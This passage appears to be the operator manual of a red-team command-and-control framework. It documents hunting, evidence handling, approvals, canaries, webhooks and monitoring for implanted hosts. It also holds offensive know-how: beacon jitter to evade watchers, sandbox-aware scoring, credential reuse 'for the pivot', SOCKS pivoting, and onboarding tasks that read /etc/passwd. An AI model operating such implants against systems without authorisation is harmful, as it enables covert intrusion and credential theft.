traces of somebody else.  The team keeps a catalogue of indicators — a
hash, a path, a mutex, a registry key, a certificate, a process, a
service — and asks the hosts whether they carry one of them.

The catalogue is shared by the team and it outlives the engagement: an
indicator that was found once is worth checking everywhere, so it lives
next to the state file of the server (`hunt.json`), not inside it, and
`engagement.wipe` does not throw it away.

```bash
# an indicator goes into the catalogue
umbra hunt add --kind hash \
  --value e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 \
  --label "the loader of TICKET-1138" --source TICKET-1138

# the catalogue, and the part of it that matches
umbra hunt list
umbra hunt list --query march          # the label, the note or the source
umbra hunt list --kind mutex

# the hunt itself: one host, or a group
umbra hunt sweep --agent web-01 --wait
umbra hunt sweep --filter state=online --wait
```

**The hunt never changes a host.**  It reads, it reports, and the
operator decides what to do with what it found.  An implant that removed
a file while it hunted would be an implant destroying evidence.

**The answer carries its limits.**  Hashing a file costs its whole
content, so the walk is bounded (20 000 files, 256 MiB, 24 levels deep),
and when the bound is reached the report says so.  A hunt that looked at
half of the disk and answers "not found" is a hunt that lies; the report
of a hunt that hit a limit carries the line `limit …` and the operator
reads it.

**The kinds that do not apply are named.**  A mutex, a registry key and
a certificate are concepts of Windows; on a Linux host or on a phone the
report says that the kind does not apply to the machine instead of
pretending that it was checked.

**The roots are the operator's decision.**  Without `--roots` the hunt
walks the home of the user, the temporary directory and the working
directory.  Walking the whole of the disk is slow and reads the material
of the user, so the framework does not do it on its own.

**The report of the hunt is signed.**  It carries the `attest` field, the
HMAC-SHA256 of the report under the key of the agent, and the server
marks the task `attested: true` when the signature holds.  A hunt that
goes into an evidence file (`umbra case add`) is a hunt that has to be
provable, and the signature travels with the bytes of the report.

## 5l. The health of the fleet

The health command scores every host of the engagement and sorts them
worst first, because the question an operator has at the end of an
engagement is "which machine do I look at".

```bash
umbra health
umbra health --json
```

| part | weight | what it measures |
|---|---|---|
| reachability | 30 | did the host answer, and how long ago |
| cadence | 15 | does the beacon keep the interval the operator asked for |
| capacity | 20 | does the host do the work, or does it fail it |
| persistence | 20 | is what the operator installed still there |
| posture | 15 | what does the implant think of the machine |

Every part carries the sentence that explains it, and the console prints
those sentences under the score: a number an operator cannot explain is
a number nobody acts on.

The grades are `healthy` (90 and above), `fair` (70), `poor` (40) and
`lost` (below).  Two rules keep the scale honest:

* a host that has **never answered** scores nothing: nothing about it is
  known, not even the parts that are usually remembered;
* a host that reports itself as a **laboratory machine, a virtual
  machine or a sandbox** gets the grade `suspect` and a score of at most
  24, however well it works: it is not a host of the engagement.

A host that has gone quiet for ten of its own intervals is capped at 24
as well, so it cannot be read as a healthy host that happens to be
silent.

## 5m. The evidence files

A case is the folder the operator hands to somebody else: the lawyer,
the customer, the court.  It says what was found, where it was found and
on which host, and it proves that nothing in it was changed after it was
taken.

```bash
umbra case create "the ticket of March" --notes "the loader of the ticket"
umbra case add c-0001 --kind screenshot --ref /var/lib/umbra/web-01.png \
  --sha256 9f2c… --agent web-01 --task t-9f3a --note "the screen of the host"
umbra case show c-0001
umbra case close c-0001 --note "the engagement is over"
```

**Every artefact is hashed when it enters the case**, and the hash is
what proves that the bytes did not change since they were taken.  The
server never reads the bytes of the evidence on its own: the hash and the
reference are what the operator gives it.

**The chain of custody is append-only.**  Every hand the evidence passes
through — opened, added, closed — is an event with the hash of the event
before it.  An event that is edited or removed after the fact breaks the
chain, and the answer names the event where it breaks:

```bash
umbra case show c-0001
# THE CHAIN IS BROKEN at event 2: the hash of the event does not fit
```

A case with a broken chain is still shown.  Hiding it would be the one
thing worse than showing it.

The cases live next to the state file (`cases.json`), they survive the
restart of the server and they survive `engagement.wipe`, because the
record of the engagement outlives the engagement.

## 5n. The two-person rule

Some operations should not hang on the word of one operator: the wipe of
a host, the end of an engagement, the removal of the persistence.  The
framework carries the rule, and the deployment says which operations
need it.

```bash
# the operator who wants the operation writes a request
umbra approval request forensics.wipe --agent web-01 \
  --reason "the engagement is over"

# a second operator decides
umbra approval list                       # what the team is waiting for
umbra approval show a-0001                # who asked, who decided, when
umbra approval approve a-0001 --note "the customer agreed"
umbra approval deny a-0001 --note "the host is still in use"
```

**The requester cannot decide.**  When the operator who asked tries to
decide, the server refuses: *the operator who asked for it cannot
decide it*.  That refusal is the whole point of the rule, so it is not
a warning that the operator may ignore — the operation does not run.

**The decision does the work.**  An approved request queues the
operation on the host right away: the task id comes back with the
decision, so the operator does not have to queue it a second time.

**A request that nobody decides goes stale** after thirty minutes.  A
stale request decides nothing, and the queue says so: *the request went
stale before anybody decided it*.

The queue belongs to the team, so it lives next to the state file
(`approval.json`) and not inside it: the request one operator wrote has
to be there for the operator who decides it, even after a restart of
the server.

The rule is a policy of the deployment, not a law of the framework.  In
the configuration of the server:

```json
{
  "server": {
    "approval_required": ["wipe.run", "wipe.self", "decommission"]
  }
}
```

A kind that is named here cannot be queued directly: `umbra run`,
`umbra task`, the bulk runs and the aliases all refuse it and say what
to do instead — *ask for it with approval.request and let a second
operator approve it*.  A deployment that names no kind has the rule
off, and the queue is still there, waiting.

## 5o. The tripwires

A tripwire is a small file with a secret in it, planted on a host in a
place where nothing of the engagement belongs.  Nobody knows it is
there, so nobody touches it.  When the file changes or disappears,
somebody else was on the machine — and the operator learns about it
while the engagement is still running.

```bash
# a tripwire on a host
umbra canary plant --agent web-01 --label "the web server"

# the ledger of the tripwires
umbra canary list
umbra canary show c-0001

# the look: are they as they were planted?
umbra canary check --agent web-01 --wait
umbra canary check --all --wait

# stop watching one
umbra canary remove c-0001
```

**The implant remembers what it planted.**  The size, the time of the
last change and the digest of the file are written next to the canary,
because the implant is the only side that knows what it wrote.  The
check compares the file with those facts and says one of three things:

| state | what it means |
|---|---|
| `intact` | the file is as it was planted |
| `changed` | somebody wrote on it |
| `missing` | the file is gone |

**The check never changes the host.**  A check that repaired the canary
would hide the very thing it is looking for, so the look is a read and
nothing else.

**The secret never leaves the host.**  The token of the canary is
written by the implant and kept by the implant and by the ledger of the
server; it is not in the answer of `canary.list`, not in the answer of
`canary.get` and not in any answer of the server.  The console has no
use for it.

**The verdict is the ledger.**  The verdicts travel in the metadata of
the answer as one short string (`c-0001=intact;c-0002=changed`), and
the server writes them into the ledger as the task finishes.  The
ledger and the answer the operator reads cannot disagree.

The ledger lives next to the state file (`canary.json`): a canary that
was planted last week is still a canary, and the operator who comes back
after the weekend has to find it.

## 5p. The file of a host

The dossier is the page an operator writes at the end of an engagement:
what do we know about this machine, and what did we do to it?

```bash
umbra dossier list          # every host, the weakest first
umbra dossier show web-01   # one host, on one page
```

The page carries the identity of the host, the health with the reasons
of its score, the work that was run (how many tasks finished, how many
failed, how many are still waiting, and a histogram of the kinds), the
persistence with the entries that are broken, the tripwires, the
requests, and the things the server does not know.

**What is missing is said as well.**  A host that never checked in has
no posture and no persistence, and the page says *the host has never
answered* instead of showing empty tables.  A gap is not a failure: it
is the place where the operator has to go and look.

**The files are sorted weakest first**, so the host that needs
attention comes before the host that does not.

## 5q. The second factor of the operator

The token of an operator is a secret that lives in the configuration of
the server and in the memory of the console.  The second factor is a
secret that lives in the phone of the operator and never travels.

```bash
umbra otp status                  # who has a second factor, and how old it is
umbra otp rotate --operator bob   # a new secret for bob, shown once
umbra otp remove --operator bob   # take it away again
umbra otp code --secret <base32>  # the code of the moment (for a lab)
```

**The code travels in the handshake.**  The console sends it in the
metadata of the HELLO, and the server checks it *before* it answers: a
console without the right code never gets a session, so it never sees
an event and never reaches a command.  The console sends it with
`--otp 123456` or `$UMBRA_OTP`.

**The secret is shown once.**  `operator.otp.rotate` makes a new secret
and hands it out in the answer, together with the `otpauth://` address
the phone of the authenticator reads.  The server keeps its copy in
`data/otp.json`, written for the server alone (`0600`), and it never
sends it again -- `operator.otp.status` says who has one, whether it is
on and how old it is, and leaves the secret out.

**The codes are the codes of the phone.**  They follow RFC 6238 with
HMAC-SHA1 and six digits, which is what every authenticator
application understands, and the server accepts a window of one step
(thirty seconds) on each side, because the clock of a phone is not the
clock of the server.  The comparison is constant time.

**An operator may turn its own second factor on and off.**  Somebody
else's is the work of an admin, and the refusal says so.

**When a phone is lost**, `umbra otp remove --operator <name>` takes
the factor away and the console of that operator works with the token
alone from then on.

## 5r. The baseline of a host

A tripwire says that somebody else was on the machine.  A baseline says
that the host is the one you saw yesterday: the team names the paths
that matter, and the server keeps the size, the time of the last change
and the digest of each.

```bash
umbra baseline add web-01 /etc/app/config.json --label "the config of the app"
umbra baseline list --agent web-01
umbra baseline check web-01 --wait
umbra baseline remove b-0001
```

**The baseline only reads.**  A baseline that rewrote the file it
watches would destroy the very thing it is watching, so the check
reads and it reports, and the operator decides what to do with the
drift.

**The drift is kept.**  A file that was touched twice does not look
like a file that was touched once: the ledger of the server keeps the
state of every path, the time of the last look, the time of the last
drift and the number of the changes.

**The look is signed.**  The findings of the look are written into a
report that is attested like every other report of the engagement: a
check of the baseline that goes into the evidence file is a check that
has to be provable.

**The look travels with the answer.**  The snapshots travel in the
metadata of the answer as one short JSON string, so the ledger of the
server and the answer the operator reads cannot disagree.

The states are the five a watched path can be in: `unknown` when
nobody ever looked, `present` when the file is as it was, `changed`
when it was touched, `missing` when it is gone, `appeared` when it
was gone and is back.

## 5s. The notes the team writes about the hosts

The dossier of a host is what the server knows about it; the notes are
what the team says:

```bash
umbra note add web-01 "the fileserver of the bridge subnet"
umbra note list --agent web-01
umbra note remove n-0001
```

The note is one short line of words, the operator who wrote it and the
moment it was written.  It travels with the dossier of the host, so a
note that is not where the host is looked at is a note nobody finds,
and the dossier of a host carries the notes about it on the same page.

The ledger of the notes lives next to the state file (`notes.json`),
it is written for the server alone (`0600`), and every note can be
taken away, because the words a team writes about a host are the words
of the engagement only while it is going on.

## 5t. The wires to the outside world

The consoles watch the events by staying connected.  The chat room,
the pager and the ticket queue watch them through a wire:

```bash
umbra hook add https://chat.corp.example/umbra --kinds task.result,agent.offline \
  --secret s3cr3t-of-the-team
umbra hook list                          # the wires and their last posts
umbra hook test h-0001                   # ring it once; nobody is paged
umbra hook remove h-0001
```

A wire carries the kinds it names: a name matches exactly, a name
ending in a star matches a beginning (`task.*` is every event of a
task), and the empty list carries everything.  The body of a post is
the event the consoles see, numbered the way the journal numbered it,
signed with `X-Umbra-Signature: sha256=…` when the wire has a secret —
the receiver checks the signature against its own copy, and a post
that does not match is a post from somebody else.  `hook.list` never
shows the secrets; they live in `hooks.json`, written for the server
alone.

The wire tells and never asks: the server posts and does not read the
answer beyond its status, follows no redirect, and lets every post run
for at most four seconds in a goroutine of its own, so a receiver that
is slow keeps nothing of the engagement waiting.  When more posts run
than the server allows, the event is dropped down that wire and the
delivery book says so — a loud drop, not a quiet lie.  The book keeps
the last posts of each wire (`status`, `latency_ms`, `err`), so the
team checks the wires without asking the outside world anything.

One decision stays with the operator: a wire is a way OUT of the
server, and an address inside the network the engagement is working in
is a way INTO that network for the news of the engagement.  The
validator refuses clever schemes; whether the place is the right one
is the call of the team.

## 5u. The wall of the techniques

```bash
umbra attack                        # the techniques the team has used
umbra attack --all                  # also the doors nobody tried
umbra attack --agent web-01         # the wall of one host
```

The MITRE ATT&CK catalogue is the common tongue of the trade.
`attack.coverage` lies the task kinds of the beacons next to the
techniques they belong to and counts the finished work: the tasks, the
hosts, the last time.  Zeros are the point — a technique with no tasks
is a door the team has not tried, which is the answer to the question
every review asks: "did you try …?"

The kinds of the server itself (the tripwires, the baseline, the
hunts) are the tools of the watch and are not counted; a kind nobody
mapped shows up under `unmapped`, so a new implant capability cannot
silently fall behind the wall.

## 5v. The digging box

```bash
umbra search tango-needle                  # everything that carries the word
umbra search tango --scope tasks           # only the tasks
umbra search /root/tango --agent web-01    # one host
umbra search svc-sql01 --scope creds       # the vault, the shape of it
```

One needle, three books: the tasks (ids, kinds, words of the
arguments, errors, and the outputs that look like text), the notes of
the team, and the credentials that came home.  Each hit is one line
with the piece of the text around the needle.  Small letters match any
casing; a needle with a capital means what it says.  Bytes that do not
read like words stay unsearched, and the secret of a credential is
never searched and never shown.

The box reads and never changes: it is the read of a viewer, capped at
two hundred hits, which is the way a box should stay.

## 5w. The rhythm of the beacons

```bash
umbra rhythm                  # the fleet, clocks first
umbra rhythm web-01           # the shape of one host, against its plan
```

An implant calls home on a clock somebody set; the rhythm says what it
actually does: the window of the check-ins, the mean pause and its
spread, the coefficient of variation, and a name for the shape — *a
metronome* (a watcher can set a clock by it), *steady*, *breathing*,
*wandering*, and *young* for a host with too few beats to say.  The
per-host view prints the plan (the configured sleep and jitter) next to
what the wire saw, because the plan and the world disagree often enough
to be worth seeing side by side.

The rhythm keeps moments, not bytes, and only in memory: the shape of a
host is the shape of today.  A host that has to hide its breath widens
its jitter; a host under suspicion that still breathes like a clock is
the one to slow down.

## 5x. The keys that open more than one door

```bash
umbra creds-reuse             # the secrets that serve on several hosts
```

The same password on two hosts is somebody reusing a key: a gift for
the pivot (one secret, several doors) and a liability at the debrief
(one hash, the whole domain).  The vault groups its records by the
digest of the material and the answer says which hosts, which accounts
and which targets — with only the first twelve hexits of the digest, so
the proof of the reuse never becomes a second leak of the material.

## 5y. The news of nothing

```bash
umbra silence add web-01 --seconds 300     # five quiet minutes is news
umbra silence list                          # the promises, and the quiet
umbra silence remove s-0001
```

The alarms of the day fire when something happens; a host that went
quiet does nothing, and nothing fires no alarm.  The watch turns the
nothing into an `agent.silent` event — the consoles see it, and a wire
(`hook add … --kinds agent.silent`) pages the chat room of the team.
One watch per host, a cooldown so a long absence is one problem and not
a drumbeat, and the promise survives a restart in `silences.json`.  For
a host nobody has ever seen, the clock starts when the promise is made:
ten quiet seconds later, the absence of the ghost is news.

## 5z. The welcome of a new host

```bash
umbra onboard add "first five minutes" sysinfo hash:path=/etc/passwd
umbra onboard add windows-round sysinfo env --tag windows --repeat --cooldown 3600
umbra onboard list                       # the shelf, the gates, the fires
umbra onboard run w-0001 web-01          # by hand: the gates stay home
umbra onboard remove w-0001
```

Every engagement greets a new host the same way; the playbook is the
greeting, written down once, and it fires the moment the host first calls
home.  The stages go through the same queue as every task — with the same
breakers and dead letters — so the welcome inherits the health rules of
the fleet for free.  A pack that goes once answers only the first hello of
each host; a `--repeat` pack greets the returns too, held back by its
cooldown; and the ledger `onboard.json` remembers the fires across a
restart, so a bounced server does not greet twice.  Every fire — the
automatic one and the one by hand — speaks to the team as `onboard.fired`.

## 5z2. The map of the doors

```bash
umbra pivot-map                          # the tree of who is behind whom
```

The pivot list is a table of doors; the map is the shape of the reach.
Every hop of the way home of a door is a branch, the door hangs on the
last hop, and the counts say the hosts, the doors and the depth of the
deepest chain.  A host nobody tunnels through sits on the first row; the
hosts deeper in the tree are further in.

## 5z3. The evidence keeps its word

```bash
umbra artifact-verify                    # every blob, asked again
umbra artifact-verify loot/one.txt       # one blob alone
```

The digest of a blob is its name on the disk; the verify reads the bytes
again and asks whether every blob still answers to its name.  The rows
that pass and the rows that do not are spelled out — with the digest the
manifest holds and the digest the bytes give — and the command exits one
when a blob is broken, so a nightly cron pages the team when the store no
longer keeps its word.

## 5z4. The hand on a queue

```bash
umbra queue hold web-01 --seconds 600 --reason "investigating the crash"
umbra queue holds                        # every paused queue, and its work
umbra queue release web-01               # the hand lifts; work goes out
```

A hold is the smallest pause the engagement has: it stops delivery to one
host and nothing else.  The host keeps checking in, the rest of the fleet
keeps working, and the tasks queue up behind the hand instead of being
lost.  The work of a held host is not cancelled, not marked and not
retried: it simply waits.  A hold with `--seconds` lifts itself, and the
journal says so with `queue.released` and `expired: true`, so a hold set
before a long night cannot outlive the person who set it.  The quiet
window is the bigger hammer and stops the whole fleet; a hold is the
hand, not the hammer.

## 5z5. The lock of the engagement

```bash
umbra freeze on --seconds 1800 --note "the customer is on the phone"
umbra freeze status                      # who holds the lock and what it stopped
umbra freeze off                         # thaw, now
```

A freeze ties every hand at once.  The beacons keep checking in and keep
delivering their results — a freeze is not a quiet window — but every
command from a console that would change something is refused, with the
name of the admin who set the lock and the moment it lifts.  Reading is
never refused: during the first minutes of an incident the engagement has
to be *looked at* before it is touched.  The refusals are counted and
`umbra freeze status` reads the count back with the last command that was
stopped, so an admin can tell a team that waited politely from a team
that fought the lock.  A freeze with a window thaws itself; a freeze
without one is lifted by hand, because a lock that outlives its reason is
worse than the risk it guards.

## 5z6. Two hosts side by side

```bash
umbra compare web-01 web-02              # what is the same, what differs
```

`fleet.compare` reads the inventory of two hosts and puts every field
next to its twin: the operating system, the architecture, the user, the
transport, the version, the cadence, the capabilities and the labels.
The rows that match are marked `=`, the ones that differ `!`, and the
labels are split into the shared ones and the ones only one host wears.
Nothing is asked of the hosts: the comparison is a reading of what the
server already knows, which is why it works on a host that has been
asleep for a week.  The question it answers is the analyst's question of
a fleet of two hundred — which of these is not like the other — and the
answer is one command instead of two screens and a memory.

## 6. Monitoring

```bash
umbra --server 127.0.0.1:4002 --operator alice stats
umbra --server 127.0.0.1:4002 --operator alice operators   # who else is connected
umbra --server 127.0.0.1:4002 --operator alice audit --limit 20
umbra --server 127.0.0.1:4002 --operator alice watch       # live event stream
umbra --server 127.0.0.1:4002 --operator alice cancel t-9f3a
journalctl -u umbra-server | grep -E "handshake failed|exceeded frame budget|queue full"
```

Signals that matter:

| Log line | Meaning |
|---|---|
| `handshake failed` (repeated, same peer) | wrong PSK, clock skew > 300 s, or scanning |
| `operator key used on the agent listener` | misconfigured implant (operator token in a beacon) |
| `agent exceeded frame budget` | runaway or hostile peer; connection dropped |
| `operator event queue full` | an operator console stopped reading; events are dropped (counted in `stats.events_dropped`), agent traffic is unaffected |
| `state save failed` | disk full/permissions — fix before restarting |
| `audit write failed` | the audit trail is incomplete; fix the disk and treat the missing window as a gap in the record |
| `rate limited` (in a response) | an operator console is looping faster than 40 RPC/s; the call was refused, not queued |

Clock skew is the most common deployment issue: the handshake rejects peers whose
`ts` differs by more than `max_clock_skew_s` (default 300 s). Keep both sides on
NTP, or raise the limit if you accept the risk.

## 7. Hardening checklist

- [ ] operator listener bound to loopback and reached over SSH/WireGuard
- [ ] HTTP transport inside an encrypted tunnel, proxy `client_max_body_size` ≥ 2 MB
- [ ] `agent.psk` and `server.env` mode `0600`, owned by the service user
- [ ] config file mode `0600` (it contains paths, not secrets, but keep it tight)
- [ ] systemd hardening enabled (the provided unit drops all capabilities)
- [ ] tokens per operator, rotated when someone leaves, fingerprints audited
- [ ] `data_file` on a filesystem with enough room for task history
- [ ] outbound allow-list on the implant host (only the C2 address/port)
- [ ] logs shipped somewhere the operators cannot silently edit
- [ ] mutual TLS for a remote console (`tls_listen`, `tls_client_ca`), the token alone is not enough
- [ ] `http_pad` set, so the length of a request does not tell what it carried
- [ ] armory signing key offline; the catalogue is signed before it is copied to the server
- [ ] `socks_listen` and `vpn_listen` bound to an interface only the team can reach
- [ ] `socks_user` and `socks_password` set on every proxy that is not bound to loopback
- [ ] `pivot_deny` holds the ranges the operation must not touch (link-local, the metadata address)
- [ ] rendered stagers deleted after the engagement (they carry the agent key)
- [ ] the journal of the engagement left off on the implants (`umbra journal <agent> --on` only when the engagement needs it)
- [ ] the traces of the engagement wiped before the host is handed back (`umbra survey`, `umbra scrub`, `umbra verify`)
- [ ] the dead man's switch disarmed on the hosts that stay (`umbra deadman <agent> --minutes 0`)

## 8. Upgrades

1. Stop the operator consoles (they reconnect).
2. Replace the binary, keep `server.json` (config is forward compatible; unknown
   keys are ignored, new fields have defaults).
3. `systemctl restart umbra-server` — established agents reconnect at their next
   cycle with fresh ephemeral keys, so nothing has to be rebuilt after a
   server-side change.
4. If the protocol changed (new `umbra/vN`), rebuild the implants; the server
   rejects `HELLO` frames whose `v` it does not implement, and logs the version
   mismatch.

## 9. Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `connection failed: ...` in the console | wrong token, wrong `--operator` name, or the server is not listening | check `UMBRA_OPERATOR_TOKENS` and that `--operator` matches the name in the env |
| agent connects but never appears | handshake rejected | run the beacon with `--verbose`; check PSK and clock |
| tasks stay `queued` | agent asleep or offline | `agents.list`, wait for the next cycle, or lower `sleep` |
| `task timed out` | command exceeds the implant's `timeout` arg (default 120 s) | pass `--args '{"cmd":"...","timeout":300}'` |
| HTTP beacon gets 401/410 | session expired (`idle_timeout_s`) or handshake failed | reload the beacon; check the reverse proxy forwards the path verbatim |
| `frame too large` | output > 1 MiB or file download > 900 KiB | use `download` chunks / redirect to a file and pull it in pieces |
| everything works, then stops after a day | keys rotated but a peer missed the `REKEY` frame | should not happen: `REKEY` always precedes `TASK_BATCH` (PROTOCOL.md §6). Look for `session rekeyed` in the beacon log; if it is missing, capture both sides and file a bug |
| link drops with "nonce mismatch" right as an operator connects or a task completes | two writers sealed and wrote out of order | nothing to fix in the field: a correctly written pair keeps `seal+write` in one critical section (SEND-SERIAL). If it recurs, it is a bug in the writer added last |
| the operator link dies with a TLS error (a bad record MAC) or answers half a request | two threads were inside the same TLS session at once | nothing to fix in the field: the transport keeps one thread inside the session at a time (TLS-ONE-SESSION, PROTOCOL.md §4). If it recurs, it is a bug in the writer added last |
| `pivot.open` says the agent never answered | the agent is asleep, or the callback was refused | the agent dials back on its own; check the agent listener is reachable from the agent host and watch the server log for `tunnel callback` |
| the SOCKS5 proxy refuses a CONNECT | the target is unreachable from the agent, not from the console | test the same target from the agent host; the proxy is only a relay |
| the SOCKS5 proxy answers `0x02` | the target is on the deny list | the connection log says which rule matched; drop the rule from `pivot_deny` or pick another target |
| the SOCKS5 proxy answers `0x01` | the agent could not open the stream | the agent is asleep or the session was lost; wait for the next cycle and try again |
| the proxy asks for a password | the tunnel carries credentials | the pair belongs to the tunnel (`--user` / `--password`) or to the permanent proxy (`socks_user` / `socks_password`) |
| a forward stops answering after the agent slept | the agent is not back yet | the listener stays bound: the first connection after the agent returns is served by the new session |
| a name does not resolve through the proxy | the agent cannot resolve that name | the name is resolved by the agent by default; `--dns local` makes the server resolve it instead |
| `pivot release` says the claim is unknown | the claim was already released, or the tunnel was closed | `umbra pivot claims` shows what is still claimed; the accounting of the released tunnels stays in the log |
| the DNS tunnel gets no answer | the resolver does not know the tunnel domain, or the agent queries the wrong one | point the agent at the server resolver (`UMBRA_DNS_RESOLVER`) and the domain (`UMBRA_DNS_DOMAIN`), and check the server log for `dns tunnel listening` |
| the WebSocket beacon refuses to connect | the route is wrong, or a proxy in front does not forward the upgrade | the upgrade happens on the beacon route (`/api/v1/beacon`); the proxy needs `proxy_set_header Upgrade $http_upgrade` |
| the console says `TLS handshake with ... failed` | the CA does not match, or the name in the certificate does not match `--tls-server-name` | pass the right `--tls-ca`, and use the name the certificate carries |
| the console is refused by the mutual TLS listener | no client certificate was presented | add `--tls-cert` and `--tls-key`; the listener always requires one |
